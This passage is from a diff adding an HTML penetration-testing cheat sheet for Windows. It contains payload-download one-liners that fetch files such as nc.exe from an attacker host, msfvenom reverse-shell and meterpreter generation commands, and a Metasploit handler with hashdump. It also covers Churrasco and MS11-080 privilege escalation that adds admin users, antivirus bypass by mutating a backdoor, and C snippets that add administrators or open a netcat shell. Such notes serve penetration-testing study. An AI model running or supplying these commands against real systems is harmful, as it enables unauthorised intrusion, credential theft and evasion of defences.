+200&nbsp;Port&nbsp;command&nbsp;successful.
+LIST</code></pre>
+                <p>Nice trick to share folders with RDP:</p>
+                <pre><code>$&nbsp;rdesktop&nbsp;(ip)&nbsp;-r&nbsp;disk:share=/home/bayo/store</code></pre>
+                <p>With powershell:</p>
+                <pre><code>$&nbsp;powershell&nbsp;-c&nbsp;<span class="green">"(new-object System.Net.WebClient).DownloadFile('</span><span class="blue">http://YOURIP:8000/b.exe</span><span class="green">','</span>C:\Users\YOURUSER\Desktop\b.exe<span class="green">')"</span></code></pre>
+                <p>Paste the following block in a command line to get a web client:</p>
+                <pre><code><span class="red">echo</span>&nbsp;strUrl&nbsp;=&nbsp;<span class="green">WScript.Arguments.Item</span>(0)&nbsp;&gt;&nbsp;wget.vbs
+echo&nbsp;StrFile&nbsp;=&nbsp;<span class="green">WScript.Arguments.Item</span>(1)&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;<span class="blue">Const</span>&nbsp;HTTPREQUEST_PROXYSETTING_DEFAULT&nbsp;=&nbsp;0&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;<span class="blue">Const</span>&nbsp;HTTPREQUEST_PROXYSETTING_PRECONFIG&nbsp;=&nbsp;0&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;<span class="blue">Const</span>&nbsp;HTTPREQUEST_PROXYSETTING_DIRECT&nbsp;=&nbsp;1&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;<span class="blue">Const</span>&nbsp;HTTPREQUEST_PROXYSETTING_PROXY&nbsp;=&nbsp;2&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;Dim&nbsp;http,varByteArray,strData,strBuffer,lngCounter,fs,ts&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;Err.Clear&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;Set&nbsp;http&nbsp;=&nbsp;Nothing&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;Set&nbsp;http&nbsp;=&nbsp;<span class="green">CreateObject</span>(<span class="green">"WinHttp.WinHttpRequest.5.1"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;<span class="blue">If</span>&nbsp;http&nbsp;<span class="blue">Is</span>&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;<span class="green">CreateObject</span>(<span class="green">"WinHttp.WinHttpRequest"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;<span class="blue">If</span>&nbsp;http&nbsp;<span class="blue">Is</span>&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;<span class="green">CreateObject</span>(<span class="green">"MSXML2.ServerXMLHTTP"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;<span class="blue">If</span>&nbsp;http&nbsp;<span class="blue">Is</span>&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;<span class="green">CreateObject</span>(<span class="green">"Microsoft.XMLHTTP"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;http.Open&nbsp;<span class="green">"GET"</span>,strURL,False&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;http.Send&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;varByteArray&nbsp;=&nbsp;http.ResponseBody&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;Set&nbsp;http&nbsp;=&nbsp;Nothing&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;Set&nbsp;fs&nbsp;=&nbsp;<span class="green">CreateObject</span>(<span class="green">"Scripting.FileSystemObject"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;Set&nbsp;ts&nbsp;=&nbsp;<span class="green">fs.CreateTextFile</span>(StrFile,True)&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;strData&nbsp;=&nbsp;<span class="green">""</span>&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;strBuffer&nbsp;=&nbsp;<span class="green">""</span>&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;<span class="red">For</span>&nbsp;lngCounter&nbsp;=&nbsp;0&nbsp;to&nbsp;<span class="green">UBound</span>(varByteArray)&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;ts.Write&nbsp;<span class="green">Chr</span>(255&nbsp;<span class="blue">And</span>&nbsp;<span class="green">Ascb</span>(<span class="green">Midb</span>(varByteArray,lngCounter&nbsp;+&nbsp;1,1)))&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;Next&nbsp;&gt;&gt;&nbsp;wget.vbs
+echo&nbsp;ts.Close&nbsp;&gt;&gt;&nbsp;wget.vbs</code></pre>
+                <p>Run with:</p>
+                <pre><code>$&nbsp;cscript&nbsp;wget.vbs&nbsp;http://&lt;attacker_ip&gt;/nc.exe&nbsp;nc.exe</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Metasploit"></a>
+            <legend>Metasploit</legend>
+                <p>Module to elevate privileges to SYSTEM by creating a service or hijacking existing ones with incorrect permissions</p>
+                <pre><code>$&nbsp;exploit/windows/local/service_permissions</code></pre>
+                <p>Other scripts</p>
+                <pre><code><span class="blue">https://github.com/GDSSecurity/Windows-Exploit-Suggester
+https://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/windows-privesc-check2.exe</span></code></pre>
+                <p>Generate php reverse shell:</p>
+                <pre><code>msfvenom&nbsp;-p&nbsp;php/reverse_php&nbsp;LHOST=&lt;Your&nbsp;IP&nbsp;Address&gt;&nbsp;LPORT=&lt;Your&nbsp;Port&nbsp;to&nbsp;Connect&nbsp;On&gt;&nbsp;-f&nbsp;raw&nbsp;&gt;&nbsp;shell.php
+msfvenom&nbsp;-p&nbsp;php/meterpreter/reverse_tcp&nbsp;LHOST=&lt;attacker_ip&gt;&nbsp;-o&nbsp;meterpreter.php
+msfvenom&nbsp;-p&nbsp;generic/shell_reverse_tcp&nbsp;LHOST=&lt;attacker_ip&gt;&nbsp;LPORT=4444&nbsp;-f&nbsp;php&nbsp;-o&nbsp;shell.php</code></pre>
+                <p>Others</p>
+                <pre><code>$&nbsp;msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=&lt;Your&nbsp;IP&nbsp;Address&gt;&nbsp;LPORT=&lt;Your&nbsp;Port&nbsp;to&nbsp;Connect&nbsp;On&gt;&nbsp;-f&nbsp;asp&nbsp;&gt;&nbsp;shell.asp</code></pre>
+                <p>Generate shellcode to use within a perl exploit:</p>
+                <pre><code>msfvenom&nbsp;-p&nbsp;linux/x86/shell/reverse_tcp&nbsp;LHOST=&lt;attacker_ip&gt;&nbsp;LPORT=443&nbsp;-f&nbsp;perl&nbsp;-b&nbsp;\x00\x0A\x0D\xFF</code></pre>
+                <p>Raw paylaod:</p>
+                <pre><code>msfvenom&nbsp;-p&nbsp;windows/x64/meterpreter/reverse_tcp&nbsp;LHOST=&lt;attacker_ip&gt;&nbsp;LPORT=4444&nbsp;-f&nbsp;raw&nbsp;-o&nbsp;test.bin</code></pre>
+                <p>Js payload:</p>
+                <pre><code>msfvenom&nbsp;-p&nbsp;linux/x86/shell_reverse_tcp&nbsp;LHOST=&lt;attacker_ip&gt;&nbsp;LPORT=443&nbsp;-f&nbsp;js_le</code></pre>
+                <p>Handling reverse shell using meterpreter:</p>
+                <pre><code>msf&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/handler
+msf&nbsp;&gt;&nbsp;set&nbsp;lport&nbsp;1234
+msf&nbsp;&gt;&nbsp;set&nbsp;lhost&nbsp;&lt;attacker_ip&gt;
+msf&nbsp;&gt;&nbsp;set&nbsp;payload&nbsp;windows/shell/reverse_tcp
+msf&nbsp;&gt;&nbsp;run</code></pre>
+                <p>Other payloads:</p>
+                <pre><code>set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp
+set&nbsp;PAYLOAD&nbsp;generic/shell_reverse_tcp
+set&nbsp;PAYLOAD&nbsp;linux/x86/meterpreter/reverse_tcp</code></pre>
+                <p>Privilege escalation</p>
+                <pre><code>getsystem
+hashdump</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Useful exploits"></a>
+            <legend>Useful exploits</legend>
+                <p>Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:</p>
+                <pre><code><span class="blue">https://www.exploit-db.com/exploits/6705/</span></code></pre>
+                <pre><code><span class="blue">https://github.com/Re4son/Churrasco</span></code></pre>
+                <pre><code>$&nbsp;c:\Inetpub&gt;churrasco
+&nbsp;churrasco
+&nbsp;/churrasco/--&gt;Usage:&nbsp;Churrasco.exe&nbsp;[-d]&nbsp;<span class="green">"command to run"</span>
+
+&nbsp;c:\Inetpub&gt;churrasco&nbsp;-d&nbsp;<span class="green">"net user /add &lt;username&gt; &lt;password&gt;"</span>
+&nbsp;c:\Inetpub&gt;churrasco&nbsp;-d&nbsp;<span class="green">"net localgroup administrators &lt;username&gt; /add"</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Windows MS11-080"></a>
+            <legend>Windows MS11-080</legend>
+                <p>http://www.exploit-db.com/exploits/18176/</p>
+                <pre><code>$&nbsp;python&nbsp;pyinstaller.py&nbsp;--onefile&nbsp;ms11-080.py</code></pre>
+                <pre><code>$&nbsp;mx11-080.exe&nbsp;-O&nbsp;XP</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="From admin to system"></a>
+            <legend>From admin to system</legend>
+                <pre><code>psexec.exe&nbsp;-i&nbsp;-s&nbsp;%SystemRoot%\system32\cmd.exe</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="AV bypass"></a>
+            <legend>AV bypass</legend>
+                <p>Generating a mutated binary to bypass antiviruses</p>
+                <pre><code>$&nbsp;wine&nbsp;hyperion.exe&nbsp;../backdoor.exe&nbsp;../backdoor_mutation.exe</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Print proof"></a>
+            <legend>Print proof</legend>
+                <pre><code>$&nbsp;echo.&nbsp;&amp;&nbsp;echo.&nbsp;&amp;&nbsp;<span class="red">echo</span>&nbsp;whoami:&nbsp;&amp;&nbsp;<span class="red">whoami</span>&nbsp;2&gt;&nbsp;nul&nbsp;&amp;&nbsp;<span class="red">echo</span>&nbsp;%username%&nbsp;2&gt;&nbsp;nul&nbsp;&amp;&nbsp;echo.&nbsp;&amp;&nbsp;<span class="red">echo</span>&nbsp;Hostname:&nbsp;&amp;&nbsp;hostname&nbsp;&amp;&nbsp;echo.&nbsp;&amp;&nbsp;ipconfig&nbsp;/all&nbsp;&amp;&nbsp;echo.&nbsp;&amp;&nbsp;<span class="red">echo</span>&nbsp;proof.txt:&nbsp;&amp;&nbsp;&nbsp;type&nbsp;<span class="green">"C:\Documents and Settings\Administrator\Desktop\proof.txt"</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Access Check"></a>
+            <legend>Access Check</legend>
+                <p>You will probably need to accept the eula first:</p>
+                <pre><code>$&nbsp;accesschk.exe&nbsp;/accepteula</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Windows hashes"></a>
+            <legend>Windows hashes</legend>
+                <p>NTLM and LM passwords are located in the SAM file in <strong>C:\\Windows\SYSTEM32\CONFIG</strong></p>
+                <p>LAN Manager (LM): Windows XP and prior use LAN manager protocol. Uses DES but the key space is small (only uppercase, not salted, 14 chars or padded to 14).</p>
+                <p>NTLM/NTLM2: It does not split the password, also stored in uppercase</p>
+                <p>Kerberos: Default protocol for active directory envs.</p>
+        </fieldset>
+        <fieldset class="box">
+            <a name="PoCs"></a>
+            <legend>PoCs</legend>
+                <p>Add user to administrator group</p>
+                <pre><code>#include&nbsp;&lt;stdlib.h&gt;
+int&nbsp;main&nbsp;()
+{
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="blue">int</span>&nbsp;i;
+&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;<span class="green">system</span>(<span class="green">"net localgroup administrators theusername /add"</span>);
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="blue">return</span>&nbsp;0;
+}</code></pre>
+                <pre><code>i686-w64-mingw32-gcc&nbsp;windows-exp.c&nbsp;-lws2_32&nbsp;-o&nbsp;exp.exe</code></pre>
+                <p>Run an arbitrary command:</p>
+                <pre><code><span class="red">echo</span>&nbsp;-e&nbsp;<span class="green">'#include &lt;stdio.h&gt;\n#include &lt;smain () {\nsystem("</span>C:\\Users\\Administrator\\Desktop\\nc&nbsp;-lvp&nbsp;4313&nbsp;-e&nbsp;cmd.exe<span class="green">");\nreturn(0);\n}'</span>&gt;&nbsp;poc.c</code></pre>
+        </fieldset>
+    <script>new Highlighter().run(document);</script>
+    <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m = s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-106217827-1', 'auto'); ga('send', 'pageview'); </script>
+    
+</body></html>
